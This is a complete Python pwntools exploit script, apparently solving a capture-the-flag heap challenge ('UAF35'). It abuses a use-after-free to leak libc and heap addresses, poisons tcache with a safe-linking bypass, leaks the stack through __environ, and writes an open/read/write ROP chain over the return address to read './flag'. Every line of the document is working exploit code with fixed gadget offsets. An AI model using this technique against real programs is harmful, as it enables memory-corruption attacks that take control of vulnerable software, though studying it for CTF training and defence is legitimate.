#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
#context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./UAF35')
libc = ELF('./libc.so.6')
elf = ELF('./UAF35')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(length,content='A'):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))
	p.sendafter('please input content:',content)

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.send(ct)

def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('idx:',str(idx))

#=========================libcbase=============================

add(0x420) #0
add(0x10) #1
delete(0)  # 放入 unsortedbin

show(0)
libcbase = u64(p.recv(6).ljust(8, "\x00")) - 0x219ce0 # unsortedbin 与 libc 偏移 == 0x219ce0
pr('libcbase',libcbase)

#===========================key-heapbase=======================

add(0x400) #2 
delete(0) # tcachebin

show(0)
key = u64(p.recv(6).ljust(8, "\x00")) # heap >> 12
heapbase = key << 12
pr('heapbase',heapbase)
pr('key',key)

#==============================================================

syscall_ret = libcbase + libc.search(asm('syscall\nret')).next()
environ_addr = libcbase + libc.sym['__environ']
bss_addr = libcbase + libc.bss()
prdx_ret = libcbase + 0x11f497 # pop rdx ; pop r12 ; ret
prdi_ret = libcbase + 0x2a3e5  # pop rdi ; ret
prsi_ret = libcbase + 0x2be51  # pop rsi ; ret
prax_ret = libcbase + 0x45eb0  # pop rax ; ret

#==========================stack===============================

edit(0, '\x00'*0x10)
delete(0)
environ = (environ_addr - 0x10) ^ key
edit(0, p64(environ))
add(0x400, p64(environ)) #3
add(0x400, '\x00'*0x10) #4 分配至 environ 

show(4)
stack = u64(p.recv(24)[-8:].ljust(8,'\x00')) # 泄露 environ 栈地址
ret = stack - 0x148 # 程序 ret 地址

pr('stack_addr',stack - 0x8)
pr('ret_addr',ret)

#===========================ret================================

delete(0)
edit(0,'\x00'*0x10)
delete(0)
edit(0, p64(ret ^ key))
add(0x400, p64(ret ^ key)) #5

#=============================orw==============================

# open
payload  = b'./flag\x00\x00' # ret
payload += p64(prdi_ret) + p64(ret) 
payload += p64(prsi_ret) + p64(0)
payload += p64(prax_ret) + p64(2)
payload += p64(syscall_ret)

#read
payload += p64(prdi_ret) + p64(3)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret ) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(0)
payload += p64(syscall_ret)

#write
payload += p64(prdi_ret) + p64(1)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret ) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(1)
payload += p64(syscall_ret)

#==============================================================

add(0x400, payload) #6 分配至程序 ret 地址处

p.interactive()